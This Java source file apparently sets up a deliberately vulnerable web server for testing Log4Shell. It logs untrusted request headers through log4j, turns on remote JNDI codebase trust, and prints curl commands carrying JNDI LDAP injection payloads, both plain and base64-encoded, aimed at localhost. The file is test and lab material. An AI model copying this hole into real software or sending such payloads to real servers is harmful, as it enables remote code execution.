// Based on BalusC example from:
// http://stackoverflow.com/questions/3732109/simple-http-server-in-java-using-only-java-se-api
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.util.Base64;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jWebServer {

  public static void main(String[] args) throws Exception {
    System.out.println("This will start a very simple web server that will trigger");
    System.out.println("the Log4Shell exploit.  Pass in a header called log_me and");
    System.out.println("this will be logged via log4j.  The default port is 8888 but");
    System.out.println("it will take a single paramter as a port");
    System.out.println("");

    int port = 8888;
    if(args.length > 0){
      try{
        port = Integer.parseInt(args[0]);
        if(port <= 0){throw new Exception();}
      }catch(Exception e){
        System.out.println("Error parsing port number.  Please enter a valid number.");
        System.exit(-1);
      }
    }
    
    System.out.println("You can call it using curl. Depending on your terminal you ");
    System.out.println("may need to escape the string :");
    System.out.println("curl -H 'log_me: ${jndi:ldap://127.0.0.1:1389/#MM_127_0_0_1_4444}' http://127.0.0.1:"+port+"/");
    System.out.println("");
    System.out.println("If the log_me header is not found it will look for a log_me_b64");
    System.out.println("header and do a base 64 decode prior to logging.");
    System.out.println("The above log_me curl example would look like : ");
    System.out.println("curl -H 'log_me_b64: JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS8jTU1fMTI3XzBfMF8xXzQ0NDR9Cg==' http://127.0.0.1:"+port+"/");
    System.out.println("");
    System.out.println("On a linux system with base64 installed you can also use : ");
    System.out.println("curl -H \"log_me_b64: `echo '${jndi:ldap://127.0.0.1:1389/#MM_127_0_0_1_4444}' | base64 -w 0`\" http://127.0.0.1:"+port+"/");
    System.out.println("");
   
    new Log4jWebServer().runServer(port); 
  }

  public void runServer(int port) throws IOException{
    HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
    server.createContext("/", new MyHandler());
    server.setExecutor(null); // creates a default executor
    server.start();
  }

  static class MyHandler implements HttpHandler {
    private static final Logger logger = LogManager.getLogger(Log4jWebServer.class);
    @Override
    public void handle(HttpExchange t) throws IOException {
      System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");

      String ip = t.getRemoteAddress().toString(); 
      System.out.println("Request received from: " + ip);

      String log_me = t.getRequestHeaders().getFirst("log_me");
      String log_me_b64 = t.getRequestHeaders().getFirst("log_me_b64");

      String response = "<html><body><h1>Please do not host this on a public computer!!!!</h1>\n";
      if( (log_me == null) && (log_me_b64 == null) ){
        response += "<h3>No logs were written.  Please see the startup output for how to enable logs.</h3>";
      }
      else if (log_me != null){
        response += "<h3>Your log_me header was : "+log_me+"</h3>";
        this.logger.error(""+ip+" : "+log_me);
      }
      else{
        response += "<h3>Your log_me_b64 header was : "+log_me_b64+"</h3>";
        try{
          String log_me_decoded = new String(Base64.getDecoder().decode(log_me_b64));
          response += "<h3>Your decoded header was : "+log_me_decoded+"</h3>";
          this.logger.error(""+ip+" : "+log_me_decoded);
        }catch(Exception ex){
        response += "<h3>There was an error decoding your msg.  Nothing was logged.</h3>";
        }
      }
      response += "</body></html>\n";

      // Sending response
      t.sendResponseHeaders(200, response.length());
      OutputStream os = t.getResponseBody();
      os.write(response.getBytes());
      os.close();
    }
  }
}
